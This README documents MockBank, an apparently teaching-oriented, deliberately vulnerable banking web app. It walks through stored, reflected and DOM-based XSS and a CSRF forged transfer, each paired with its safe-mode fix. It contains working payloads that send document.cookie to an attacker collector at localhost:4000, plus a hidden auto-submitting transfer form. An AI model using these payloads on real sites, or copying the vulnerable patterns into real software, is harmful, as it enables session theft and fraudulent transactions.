# MockBank

A deliberately vulnerable web banking app for demonstrating **XSS** (stored /
reflected / DOM) and **CSRF** attacks — and the corresponding defenses — for
a university security presentation. UI inspired by Monobank.

> ⚠️ Intentionally insecure in `--mode=vulnerable` (the default).
> Do not expose it to any network you don't fully control.

---

## Stack

- Node.js + Express
- `express-session` (in-memory) + `cookie-parser`
- No template engine, no frontend framework, no build step
- Font: Inter (Google Fonts)

---

## Run

```bash
npm install

# Vulnerable mode (default) — for demoing attacks
node server.js

# Safe mode — for demoing the fixes
node server.js --mode=safe
```

App runs at **http://localhost:3000**.

Demo accounts (hardcoded, in-memory):

| User  | Password  | Starting balance |
|-------|-----------|-----------------:|
| vlad  | vlad123   |          10 000 ₴ |
| misha | misha123  |           5 000 ₴ |

The current mode is shown as a pill badge in the navbar
(orange = vulnerable, green = safe).

---

## Attack 1 — Stored XSS (cookie theft)

### 1. Start the XSS collector (port 4000)

In a second terminal:

```bash
node attacker/xss-collector.js
```

Open **http://localhost:4000** — this is the attacker's dashboard. It lists
every cookie captured, auto-refreshing every 3 seconds.

### 2. Log in and inject the payload

1. Go to http://localhost:3000 and sign in as `vlad / vlad123`.
2. Send a transfer to `misha` with any amount, and paste this into the
   **Коментар** (note) field:

   ```html
   <script>fetch('http://localhost:4000/steal?c='+document.cookie)</script>
   ```

3. The transfer completes. The note is stored in the transaction history
   and rendered back on the dashboard **unescaped**.
4. Every time the dashboard renders, the injected `<script>` runs and
   `document.cookie` (including the session cookie, because
   `httpOnly: false` in vulnerable mode) is shipped to the attacker.
5. Switch to the collector tab — the session cookie appears in the table.

Alternate payload that doesn't need `<script>`:

```html
<img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">
```

### Why it works
- Transaction notes are rendered into HTML **without escaping**.
- The session cookie has `httpOnly: false`, so `document.cookie` sees it.

### Fix (`--mode=safe`)
- All user input passes through `escapeHtml()` before rendering.
- The session cookie is set with `httpOnly: true`.
- CSP (`default-src 'self'`) also blocks the exfiltration `fetch()` to
  `:4000` as a second line of defense.

---

## Attack 2 — Reflected XSS (GET /search)

The search page reflects the `?q=` parameter back into the page.

### Demo payload

Log in, then open:

```
http://localhost:3000/search?q=<script>alert('XSS')</script>
```

Or cookie-stealing variant:

```
http://localhost:3000/search?q=<script>fetch('http://localhost:4000/steal?c='+document.cookie)</script>
```

The "Результати пошуку для: …" line renders the query **raw** in vulnerable
mode — the script executes. A real attacker delivers this link via email /
messenger / malicious ad.

### Fix (`--mode=safe`)
- The query is passed through `escapeHtml()` before being rendered.
- CSP blocks inline `<script>` execution even if escaping were missing.

---

## Attack 3 — DOM-based XSS (GET /profile)

The profile page reads `location.hash` client-side and writes it into the
DOM. The server never sees the payload — the entire attack happens in the
browser.

### Demo payload

Log in, then open:

```
http://localhost:3000/profile#<img src=x onerror=alert(document.cookie)>
```

Vulnerable mode uses:

```js
document.getElementById('welcome').innerHTML =
  'Привіт, ' + decodeURIComponent(location.hash.slice(1));
```

`innerHTML` parses the injected `<img>` → `onerror` fires → `alert` runs
with the document cookie. Nothing in this round-trip ever touches the
server, so server-side escaping wouldn't have helped.

### Fix (`--mode=safe`)

```js
document.getElementById('welcome').textContent =
  'Привіт, ' + decodeURIComponent(location.hash.slice(1));
```

`textContent` inserts the value as literal text — no HTML parsing, no
script execution. CSP blocks inline event handlers (`onerror="…"`) as
well.

---

## Attack 4 — CSRF (forged transfer)

### 1. Log in as vlad

Go to http://localhost:3000, sign in as `vlad / vlad123`. **Keep the tab open**.

### 2. Open the attacker page

Open `attacker/csrf.html` directly in the **same browser** (via `file://`
or double-click). It looks like a lottery / prize page.

### 3. Click "CLAIM MY PRIZE NOW"

An attack-console overlay walks through each step of the CSRF forgery
(no CSRF token required → crafting forged request → submitting as victim).
After ~5 seconds the hidden form auto-submits to
`POST http://localhost:3000/transfer` with `to=misha, amount=5000`.

Because the browser attaches vlad's session cookie to the cross-origin
POST (no CSRF token, `sameSite` isn't `strict`), the transfer succeeds.

### Why it works
- `POST /transfer` accepts any authenticated request — no CSRF token.
- Session cookie uses `sameSite: 'lax'`, which still permits top-level
  form submissions from another origin.

### Fix (`--mode=safe`)
- A per-session CSRF token is embedded as a hidden `_csrf` field in the
  transfer form.
- `POST /transfer` rejects requests where `_csrf` is missing or doesn't
  match the session value (HTTP 403).
- The session cookie is set with `sameSite: 'strict'`, so the browser
  refuses to send it on cross-origin requests in the first place.

Restart in safe mode, log back in as vlad, open `csrf.html`, click the
button — the request is blocked with *"CSRF token missing or invalid"*.

---

## Safe-mode defenses summary

| Concern                | Vulnerable                 | Safe                                              |
|------------------------|----------------------------|---------------------------------------------------|
| Note / query rendering | raw HTML                   | `escapeHtml()`                                    |
| Profile hash handling  | `innerHTML`                | `textContent`                                     |
| Session cookie         | `httpOnly: false`          | `httpOnly: true`                                  |
| Cookie SameSite        | `lax`                      | `strict`                                          |
| CSRF token             | none                       | per-session, validated on POST                    |
| CSP header             | not sent                   | `default-src 'self'; script-src 'self'`           |
| Mode badge             | 🟠 VULNERABLE              | 🟢 SAFE                                           |

Flip between the two by restarting with / without `--mode=safe`.

---

## Project layout

```
mockbank/
├── server.js                 entry; parses --mode, wires routes + session + CSP
├── routes/
│   ├── auth.js               GET/POST /login, GET /logout
│   ├── transfer.js           GET /dashboard, POST /transfer (+ CSRF check)
│   └── xss.js                GET /search (reflected), GET /profile (DOM)
├── views/
│   ├── layout.js             shared HTML shell (nav, mode pill, theme)
│   ├── dashboard.js          balance + form + transactions
│   ├── search.js             reflected-XSS vector view
│   ├── profile.js            DOM-XSS vector view
│   └── escape.js             escapeHtml() — used in safe mode
├── public/
│   ├── app.css               Monobank-inspired theme (shared)
│   ├── login.html            static login page
│   ├── login.js              login error display
│   ├── profile-vulnerable.js innerHTML sink (vulnerable mode)
│   └── profile-safe.js       textContent sink (safe mode)
└── attacker/
    ├── csrf.html             "lottery" page with hidden auto-submit form
    └── xss-collector.js      :4000 server that logs captured cookies
```

---

## Browser note (vulnerable mode only)

Plain `http://localhost` + `SameSite=None` + no `Secure` → Chrome drops the
cookie. Vulnerable mode uses `SameSite=Lax` instead so login works cross-port
and the CSRF demo still fires. Safe mode uses `SameSite=Strict` regardless.
